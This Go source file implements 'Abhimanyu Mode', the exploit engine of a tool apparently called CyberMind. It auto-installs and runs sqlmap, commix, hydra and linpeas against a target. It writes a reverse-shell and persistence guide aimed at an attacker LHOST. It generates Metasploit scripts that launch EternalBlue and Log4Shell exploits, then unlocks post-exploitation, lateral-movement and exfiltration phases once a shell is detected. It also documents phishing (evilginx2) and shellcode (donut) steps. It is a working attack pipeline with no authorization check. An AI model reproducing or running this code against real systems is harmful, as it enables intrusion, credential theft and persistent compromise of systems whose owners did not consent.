// Package abhimanyu — CyberMind Abhimanyu Mode (Exploit Engine)
// Linux-only. Auto-chains from hunt results.
// Named after Abhimanyu from Mahabharata — enters the Chakravyuh, fights every layer.
//
// Usage:
//   cybermind /abhimanyu <target>              — full exploit (all vuln types)
//   cybermind /abhimanyu <target> sqli         — SQLi only
//   cybermind /abhimanyu <target> xss          — XSS only
//   cybermind /abhimanyu <target> rce          — RCE/CMDi only
//   cybermind /abhimanyu <target> auth         — Auth brute force
//   cybermind /abhimanyu <target> network      — Network vulns
//   cybermind /abhimanyu <target> postexploit  — Post-exploitation only
//   cybermind /abhimanyu <target> lateral      — Lateral movement only
//   cybermind /abhimanyu <target> exfil        — Exfiltration only
//
// Auto-chain: /recon → /hunt → /abhimanyu (user prompted after hunt)
// Session persistence: results saved to /tmp/cybermind_abhimanyu_<target>/session.json
package abhimanyu

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

// ExploitResult holds output from a single exploit tool
type ExploitResult struct {
	Tool    string
	Output  string
	Error   string
	Took    time.Duration
	Success bool
}

// AbhimanyuContext carries intelligence through the exploit pipeline.
// Pre-populated from hunt results when auto-chaining.
type AbhimanyuContext struct {
	Target      string
	TargetType  string // "domain" | "ip"
	VulnType    string // "all" | "sqli" | "xss" | "rce" | "auth" | "network" | "postexploit" | "lateral" | "exfil"
	LHOST       string // attacker IP for reverse shells

	// From hunt (pre-populated if chained)
	LiveURLs     []string
	OpenPorts    []int
	XSSFound     []string
	VulnsFound   []string
	ParamsFound  []string
	WAFDetected  bool
	WAFVendor    string
	Technologies []string

	// Populated during exploit phases
	Results       []ExploitResult
	ShellObtained bool
	ShellType     string // "bash" | "meterpreter" | "cmd"

	// Session tracking for continuous research
	SessionID   string
	SessionDir  string
	StartedAt   time.Time
	LastUpdated time.Time
}

// AbhimanyuSession is persisted to disk for continuous research across sessions
type AbhimanyuSession struct {
	Target      string            `json:"target"`
	VulnType    string            `json:"vuln_type"`
	LHOST       string            `json:"lhost"`
	StartedAt   time.Time         `json:"started_at"`
	LastUpdated time.Time         `json:"last_updated"`
	ToolsRun    []string          `json:"tools_run"`
	Findings    map[string]string `json:"findings"`
	ShellObtained bool            `json:"shell_obtained"`
	ShellType   string            `json:"shell_type"`
	OpenPorts   []int             `json:"open_ports"`
	VulnsFound  []string          `json:"vulns_found"`
	XSSFound    []string          `json:"xss_found"`
	ParamsFound []string          `json:"params_found"`
	WAFDetected bool              `json:"waf_detected"`
	Technologies []string         `json:"technologies"`
}

// AbhimanyuStatusKind represents the live status of an exploit tool
type AbhimanyuStatusKind string

const (
	StatusRunning AbhimanyuStatusKind = "running"
	StatusDone    AbhimanyuStatusKind = "done"
	StatusFailed  AbhimanyuStatusKind = "failed"
	StatusSkipped AbhimanyuStatusKind = "skipped"
	StatusInstalling AbhimanyuStatusKind = "installing"
)

// AbhimanyuStatus is emitted for each tool during execution
type AbhimanyuStatus struct {
	Tool   string
	Kind   AbhimanyuStatusKind
	Reason string
	Took   time.Duration
}

// ToolSpec defines an exploit tool
type ToolSpec struct {
	Name         string
	Phase        int
	Timeout      int
	VulnTypes    []string // which vuln types this tool applies to
	BuildArgs    func(target string, ctx *AbhimanyuContext) []string
	FallbackArgs []func(target string, ctx *AbhimanyuContext) []string
	InstallHint  string
	InstallCmd   string // exact install command
}

// run executes a command with timeout
func run(timeoutSec int, name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	var out bytes.Buffer
	var errOut bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errOut
	cmd.Stdin = nil // never read from tty — prevents zsh: suspended (tty input)

	done := make(chan error, 1)
	go func() { done <- cmd.Run() }()

	select {
	case err := <-done:
		combined := out.String()
		if combined == "" {
			combined = errOut.String()
		}
		if err != nil && combined == "" {
			return "", err
		}
		return combined, nil
	case <-time.After(time.Duration(timeoutSec) * time.Second):
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		partial := out.String()
		if partial != "" {
			return partial + "\n[timeout — partial results]", nil
		}
		return "", fmt.Errorf("timeout after %ds", timeoutSec)
	}
}

// isAvailable checks if a tool is installed
func isAvailable(tool string) bool {
	_, err := exec.LookPath(tool)
	return err == nil
}

// InstallTool installs a missing exploit tool
func InstallTool(spec ToolSpec, progress func(AbhimanyuStatus)) error {
	if isAvailable(spec.Name) {
		return nil
	}
	progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusInstalling, Reason: "installing..."})

	if spec.InstallCmd == "" {
		return fmt.Errorf("no install command for %s", spec.Name)
	}

	cmd := exec.Command("bash", "-c", spec.InstallCmd)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = nil // prevent tty suspension during install
	if err := cmd.Run(); err != nil {
		progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusFailed, Reason: err.Error()})
		return err
	}

	progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusDone})
	return nil
}

// RunExploitTool runs a single exploit tool exhaustively (primary → fallbacks)
func RunExploitTool(spec ToolSpec, ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) ExploitResult {
	start := time.Now()
	progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusRunning})

	// Primary run
	args := spec.BuildArgs(ctx.Target, ctx)
	output, err := run(spec.Timeout, spec.Name, args...)

	if strings.TrimSpace(output) != "" {
		took := time.Since(start)
		progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusDone, Took: took})
		return ExploitResult{Tool: spec.Name, Output: output, Took: took, Success: true}
	}

	// Try fallbacks
	for i, fb := range spec.FallbackArgs {
		progress(AbhimanyuStatus{
			Tool:   spec.Name,
			Kind:   StatusRunning,
			Reason: fmt.Sprintf("fallback %d/%d", i+1, len(spec.FallbackArgs)),
		})
		fbArgs := fb(ctx.Target, ctx)
		fbOut, fbErr := run(spec.Timeout, spec.Name, fbArgs...)
		if strings.TrimSpace(fbOut) != "" {
			took := time.Since(start)
			progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusDone, Took: took})
			return ExploitResult{Tool: spec.Name, Output: fbOut, Took: took, Success: true}
		}
		_ = fbErr
	}

	took := time.Since(start)
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}
	progress(AbhimanyuStatus{Tool: spec.Name, Kind: StatusFailed, Took: took, Reason: errMsg})
	return ExploitResult{Tool: spec.Name, Error: errMsg, Took: took, Success: false}
}

// RunAbhimanyuMode runs the full exploit pipeline using the registry.
// Pre-installs all missing tools, then runs phase by phase.
// Uses AI to make real-time decisions about which exploits to try based on findings.
// Saves session to disk for continuous research.
func RunAbhimanyuMode(ctx *AbhimanyuContext, progress func(AbhimanyuStatus)) []ExploitResult {
	// Setup session directory — 0700 so only owner can read exploit findings
	ctx.SessionDir = fmt.Sprintf("/tmp/cybermind_abhimanyu_%s", sanitizeTarget(ctx.Target))
	os.MkdirAll(ctx.SessionDir, 0700)
	ctx.StartedAt = time.Now()
	ctx.SessionID = fmt.Sprintf("%d", ctx.StartedAt.Unix())

	// Load previous session if exists (continuous research)
	prevSession := loadSession(ctx.SessionDir)
	if prevSession != nil {
		if len(prevSession.OpenPorts) > 0 && len(ctx.OpenPorts) == 0 {
			ctx.OpenPorts = prevSession.OpenPorts
		}
		if len(prevSession.VulnsFound) > 0 && len(ctx.VulnsFound) == 0 {
			ctx.VulnsFound = prevSession.VulnsFound
		}
		if len(prevSession.XSSFound) > 0 && len(ctx.XSSFound) == 0 {
			ctx.XSSFound = prevSession.XSSFound
		}
		if len(prevSession.ParamsFound) > 0 && len(ctx.ParamsFound) == 0 {
			ctx.ParamsFound = prevSession.ParamsFound
		}
		if len(prevSession.Technologies) > 0 && len(ctx.Technologies) == 0 {
			ctx.Technologies = prevSession.Technologies
		}
		if !ctx.WAFDetected {
			ctx.WAFDetected = prevSession.WAFDetected
		}
	}

	// Get tools for this vuln type
	tools := GetToolsByVulnType(ctx.VulnType)

	// ── Smart phase filtering based on target type ────────────────────────
	isWebTarget := ctx.TargetType == "domain" || (ctx.TargetType == "" && !isIPAddress(ctx.Target))
	hasShell := ctx.ShellObtained
	hasRCE := false
	for _, v := range ctx.VulnsFound {
		if strings.Contains(strings.ToLower(v), "rce") || strings.Contains(strings.ToLower(v), "command") {
			hasRCE = true
			break
		}
	}
	skipPostExploit := isWebTarget && !hasShell && !hasRCE && ctx.VulnType == "all"

	// Phase 0: Pre-install all missing tools
	for _, spec := range tools {
		if !isAvailable(spec.Name) {
			InstallTool(spec, progress)
		}
	}

	var results []ExploitResult
	findings := make(map[string]string)

	// ── Generate reverse shell commands upfront ───────────────────────────
	// These are real working commands — save to session dir for user reference
	if ctx.LHOST != "" {
		shells := GenerateReverseShell(ctx.LHOST, "4444")
		var shellGuide strings.Builder
		shellGuide.WriteString("# CyberMind Reverse Shell Guide\n")
		shellGuide.WriteString(fmt.Sprintf("# Target: %s | LHOST: %s | LPORT: 4444\n\n", ctx.Target, ctx.LHOST))
		shellGuide.WriteString("## Start listener FIRST:\n")
		shellGuide.WriteString(fmt.Sprintf("nc -lvnp 4444\n\n"))
		shellGuide.WriteString("## Reverse shell payloads (use after RCE confirmed):\n")
		for name, cmd := range shells {
			shellGuide.WriteString(fmt.Sprintf("### %s:\n%s\n\n", name, cmd))
		}
		persistence := GeneratePersistenceCommands(ctx.LHOST, "4444")
		shellGuide.WriteString("## Persistence (after shell obtained):\n")
		for name, cmd := range persistence {
			shellGuide.WriteString(fmt.Sprintf("### %s:\n%s\n\n", name, cmd))
		}
		shellGuidePath := ctx.SessionDir + "/shell_guide.md"
		os.WriteFile(shellGuidePath, []byte(shellGuide.String()), 0600)
		progress(AbhimanyuStatus{
			Tool:   "shell-guide",
			Kind:   StatusDone,
			Reason: fmt.Sprintf("Shell guide saved: %s", shellGuidePath),
		})
	}

	// ── Generate Metasploit resource script ──────────────────────────────
	// This is a real .rc file that msfconsole can execute
	rcPath := generateMSFResourceScript(ctx)
	if rcPath != "" {
		progress(AbhimanyuStatus{
			Tool:   "msf-resource",
			Kind:   StatusDone,
			Reason: fmt.Sprintf("MSF resource script: msfconsole -r %s", rcPath),
		})
	}

	for phase := 1; phase <= 6; phase++ {
		// Skip post-exploit/lateral/exfil phases for web targets without shell
		if skipPostExploit && phase >= 4 {
			for _, spec := range tools {
				if spec.Phase == phase {
					progress(AbhimanyuStatus{
						Tool:   spec.Name,
						Kind:   StatusSkipped,
						Reason: "post-exploit skipped — no shell/RCE confirmed on web target",
					})
				}
			}
			continue
		}

		// Skip evilginx2 — requires domain + SSL certificate (cannot be automated)
		// Skip donut — requires a pre-built payload file
		// These are documented in shell_guide.md for manual use

		for _, spec := range tools {
			if spec.Phase != phase {
				continue
			}

			// Tools that require manual setup — skip auto-run, document instead
			manualOnlyTools := map[string]string{
				"evilginx2": "Requires domain + SSL cert. Manual setup: evilginx2 -developer -p /usr/share/evilginx/phishlets/",
				"donut":     "Requires pre-built payload. Manual: donut -f payload.exe -o shellcode.bin",
				"ligolo-ng": "Requires agent on target. Manual: ligolo-ng -selfcert -laddr 0.0.0.0:11601",
			}
			if reason, isManual := manualOnlyTools[spec.Name]; isManual {
				progress(AbhimanyuStatus{
					Tool:   spec.Name,
					Kind:   StatusSkipped,
					Reason: reason,
				})
				// Save manual instructions to session dir
				manualPath := ctx.SessionDir + "/manual_" + spec.Name + ".txt"
				os.WriteFile(manualPath, []byte(reason+"\n"), 0600)
				continue
			}

			if !isAvailable(spec.Name) {
				progress(AbhimanyuStatus{
					Tool:   spec.Name,
					Kind:   StatusSkipped,
					Reason: "not installed — " + spec.InstallHint,
				})
				continue
			}

			result := RunExploitTool(spec, ctx, progress)
			results = append(results, result)
			ctx.Results = append(ctx.Results, result)

			if result.Output != "" {
				findings[spec.Name] = result.Output

				// ── Real-time context update from tool output ─────────────
				updateAbhimanyuContext(spec.Name, result.Output, ctx)

				// ── Adaptive: if shell obtained, enable post-exploit ──────
				if !ctx.ShellObtained && detectShellObtained(result.Output) {
					ctx.ShellObtained = true
					ctx.ShellType = detectShellType(result.Output)
					skipPostExploit = false // unlock post-exploit phases
					progress(AbhimanyuStatus{
						Tool:   spec.Name,
						Kind:   StatusDone,
						Reason: fmt.Sprintf("SHELL OBTAINED: %s — post-exploit phases unlocked", ctx.ShellType),
					})
					// Save shell info
					shellInfo := fmt.Sprintf("Shell obtained via %s\nType: %s\nTarget: %s\nTime: %s\n\nOutput snippet:\n%s",
						spec.Name, ctx.ShellType, ctx.Target, time.Now().Format(time.RFC3339),
						result.Output[:min(500, len(result.Output))])
					os.WriteFile(ctx.SessionDir+"/shell_obtained.txt", []byte(shellInfo), 0600)
				}

				saveSession(ctx, findings)
			}
		}
	}

	// Final session save
	saveSession(ctx, findings)

	// Print session summary
	progress(AbhimanyuStatus{
		Tool:   "session",
		Kind:   StatusDone,
		Reason: fmt.Sprintf("Session saved: %s | Shell: %v | Vulns: %d", ctx.SessionDir, ctx.ShellObtained, len(ctx.VulnsFound)),
	})

	return results
}

// generateMSFResourceScript creates a real Metasploit resource script (.rc file)
// that can be run with: msfconsole -r /path/to/script.rc
// This is genuinely useful — msfconsole -r is the real way to automate MSF.
func generateMSFResourceScript(ctx *AbhimanyuContext) string {
	if ctx.SessionDir == "" {
		return ""
	}

	var rc strings.Builder
	rc.WriteString("# CyberMind Metasploit Resource Script\n")
	rc.WriteString(fmt.Sprintf("# Target: %s | Generated: %s\n\n", ctx.Target, time.Now().Format(time.RFC3339)))

	// Setup workspace
	rc.WriteString(fmt.Sprintf("workspace -a cybermind_%s\n", sanitizeTarget(ctx.Target)))

	// Port scan via db_nmap
	portList := portListOrDefault(ctx.OpenPorts, "22,80,443,445,3389,8080,8443")
	rc.WriteString(fmt.Sprintf("db_nmap -sV -sC -T4 -p %s %s\n", portList, ctx.Target))
	rc.WriteString("vulns\n")
	rc.WriteString("services\n\n")

	// Tech-specific modules
	techStr := strings.ToLower(strings.Join(ctx.Technologies, " "))

	if strings.Contains(techStr, "smb") || containsPort(ctx.OpenPorts, 445) {
		rc.WriteString("# SMB enumeration\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/smb/smb_version\nset RHOSTS %s\nrun\n\n", ctx.Target))
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	if containsPort(ctx.OpenPorts, 22) {
		rc.WriteString("# SSH enumeration\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/ssh/ssh_version\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	if containsPort(ctx.OpenPorts, 3306) {
		rc.WriteString("# MySQL enumeration\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/mysql/mysql_version\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	if containsPort(ctx.OpenPorts, 6379) {
		rc.WriteString("# Redis — unauthenticated access check\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/redis/redis_server\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	if containsPort(ctx.OpenPorts, 27017) {
		rc.WriteString("# MongoDB — unauthenticated access check\n")
		rc.WriteString(fmt.Sprintf("use auxiliary/scanner/mongodb/mongodb_login\nset RHOSTS %s\nrun\n\n", ctx.Target))
	}

	// CVE-based modules from vulns found
	for _, vuln := range ctx.VulnsFound {
		lower := strings.ToLower(vuln)
		if strings.Contains(lower, "ms17-010") || strings.Contains(lower, "eternalblue") {
			rc.WriteString("# EternalBlue (MS17-010)\n")
			rc.WriteString(fmt.Sprintf("use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS %s\n", ctx.Target))
			if ctx.LHOST != "" {
				rc.WriteString(fmt.Sprintf("set LHOST %s\n", ctx.LHOST))
			}
			rc.WriteString("run\n\n")
		}
		if strings.Contains(lower, "log4shell") || strings.Contains(lower, "cve-2021-44228") {
			rc.WriteString("# Log4Shell (CVE-2021-44228)\n")
			rc.WriteString(fmt.Sprintf("use exploit/multi/misc/log4shell_header_injection\nset RHOSTS %s\n", ctx.Target))
			if ctx.LHOST != "" {
				rc.WriteString(fmt.Sprintf("set LHOST %s\n", ctx.LHOST))
			}
			rc.WriteString("run\n\n")
		}
	}

	rc.WriteString("# Show all findings\nvulns\ncreds\nloot\n")
	rc.WriteString("exit\n")

	rcPath := ctx.SessionDir + "/cybermind_msf.rc"
	if err := os.WriteFile(rcPath, []byte(rc.String()), 0600); err != nil {
		return ""
	}
	return rcPath
}

// containsPort checks if a port is in the list
func containsPort(ports []int, port int) bool {
	for _, p := range ports {
		if p == port {
			return true
		}
	}
	return false
}

// min returns the smaller of two ints
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// updateAbhimanyuContext extracts intelligence from tool output in real-time.
func updateAbhimanyuContext(tool, output string, ctx *AbhimanyuContext) {
	lower := strings.ToLower(output)
	switch tool {
	case "sqlmap":
		// Extract database names, tables, credentials
		if strings.Contains(lower, "available databases") || strings.Contains(lower, "[info] fetching") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "SQLi confirmed: "+tool)
		}
	case "commix":
		if strings.Contains(lower, "command injection") || strings.Contains(lower, "os-shell") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "CMDi/RCE confirmed: "+tool)
		}
	case "tplmap":
		if strings.Contains(lower, "ssti") || strings.Contains(lower, "template injection") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "SSTI confirmed: "+tool)
		}
	case "hydra":
		// Extract cracked credentials
		for _, line := range strings.Split(output, "\n") {
			if strings.Contains(strings.ToLower(line), "[success]") || strings.Contains(strings.ToLower(line), "login:") {
				ctx.VulnsFound = appendUnique(ctx.VulnsFound, "Auth bypass: "+strings.TrimSpace(line))
			}
		}
	case "linpeas":
		// Extract privesc vectors
		if strings.Contains(lower, "sudo") && strings.Contains(lower, "nopasswd") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "PrivEsc: sudo NOPASSWD found")
		}
		if strings.Contains(lower, "suid") {
			ctx.VulnsFound = appendUnique(ctx.VulnsFound, "PrivEsc: SUID binary found")
		}
	}
}

// detectShellObtained checks if tool output indicates a shell was obtained.
func detectShellObtained(output string) bool {
	lower := strings.ToLower(output)
	indicators := []string{
		"os-shell>", "os-pwn>", "meterpreter>", "shell>",
		"uid=", "whoami", "root@", "www-data@",
		"command execution successful", "shell obtained",
		"[*] command shell session", "opened reverse shell",
	}
	for _, ind := range indicators {
		if strings.Contains(lower, ind) {
			return true
		}
	}
	return false
}

// detectShellType identifies the type of shell obtained.
func detectShellType(output string) string {
	lower := strings.ToLower(output)
	if strings.Contains(lower, "meterpreter") {
		return "meterpreter"
	}
	if strings.Contains(lower, "os-shell") {
		return "os-shell"
	}
	if strings.Contains(lower, "cmd.exe") || strings.Contains(lower, "windows") {
		return "cmd"
	}
	return "bash"
}

// appendUnique appends to slice only if not already present.
func appendUnique(slice []string, val string) []string {
	for _, s := range slice {
		if s == val {
			return slice
		}
	}
	return append(slice, val)
}

// GetCombinedOutput returns all exploit tool outputs as one string
func GetCombinedOutput(results []ExploitResult) string {
	var b strings.Builder
	for _, r := range results {
		if r.Output != "" {
			b.WriteString(fmt.Sprintf("=== %s ===\n%s\n\n", strings.ToUpper(r.Tool), r.Output))
		}
	}
	return b.String()
}

// CheckTools returns which abhimanyu tools are available
func CheckTools() map[string]bool {
	result := make(map[string]bool)
	for _, spec := range exploitRegistry {
		result[spec.Name] = isAvailable(spec.Name)
	}
	// Also check extra tools used in persistence/exfil
	for _, extra := range []string{"curl", "scp", "nc", "socat", "iodine"} {
		result[extra] = isAvailable(extra)
	}
	return result
}

// loadSession loads a previous abhimanyu session from disk
func loadSession(sessionDir string) *AbhimanyuSession {
	data, err := os.ReadFile(sessionDir + "/session.json")
	if err != nil {
		return nil
	}
	var session AbhimanyuSession
	if err := json.Unmarshal(data, &session); err != nil {
		return nil
	}
	return &session
}

// saveSession persists the current session to disk for continuous research
func saveSession(ctx *AbhimanyuContext, findings map[string]string) {
	if ctx.SessionDir == "" {
		return
	}
	toolsRun := make([]string, 0, len(findings))
	for t := range findings {
		toolsRun = append(toolsRun, t)
	}
	session := AbhimanyuSession{
		Target:        ctx.Target,
		VulnType:      ctx.VulnType,
		LHOST:         ctx.LHOST,
		StartedAt:     ctx.StartedAt,
		LastUpdated:   time.Now(),
		ToolsRun:      toolsRun,
		Findings:      findings,
		ShellObtained: ctx.ShellObtained,
		ShellType:     ctx.ShellType,
		OpenPorts:     ctx.OpenPorts,
		VulnsFound:    ctx.VulnsFound,
		XSSFound:      ctx.XSSFound,
		ParamsFound:   ctx.ParamsFound,
		WAFDetected:   ctx.WAFDetected,
		Technologies:  ctx.Technologies,
	}
	data, err := json.MarshalIndent(session, "", "  ")
	if err != nil {
		return
	}
	// 0600 — session contains exploit findings, credentials, shell info
	os.WriteFile(ctx.SessionDir+"/session.json", data, 0600)
}

// sanitizeTarget makes a target string safe for use as a directory name
func sanitizeTarget(target string) string {
	r := strings.NewReplacer(
		"https://", "",
		"http://", "",
		"/", "_",
		":", "_",
		".", "_",
	)
	return r.Replace(target)
}

// isIPAddress returns true if target looks like an IP address
func isIPAddress(target string) bool {
	// Simple check: all parts are numeric when split by "."
	parts := strings.Split(target, ".")
	if len(parts) != 4 {
		return false
	}
	for _, p := range parts {
		if len(p) == 0 || len(p) > 3 {
			return false
		}
		for _, c := range p {
			if c < '0' || c > '9' {
				return false
			}
		}
	}
	return true
}
